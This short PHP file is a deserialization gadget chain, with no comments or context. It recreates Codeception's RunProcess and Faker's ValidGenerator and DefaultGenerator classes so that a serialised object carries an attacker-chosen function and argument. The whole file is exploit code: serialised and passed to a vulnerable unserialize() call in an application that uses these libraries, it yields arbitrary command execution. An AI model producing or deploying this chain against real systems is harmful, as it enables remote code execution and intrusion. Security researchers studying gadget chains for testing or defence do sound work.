<?php

namespace Codeception\Extension
{
    class RunProcess
    {
        private $processes;

        function __construct($function,$param)
        {
            $this->processes = [new \Faker\ValidGenerator($function,$param)];
        }
    }
}

namespace Faker
{
    class ValidGenerator
    {
        protected $generator;
        protected $maxRetries;
        protected $validator;

        function __construct($function,$param)
        {
            $this->maxRetries = 1;
            $this->validator = $function;
            $this->generator = new \Faker\DefaultGenerator($param);
        }
    }

    class DefaultGenerator{
        protected $default;

        function __construct($param)
        {
            $this->default = $param;
        }
    }
}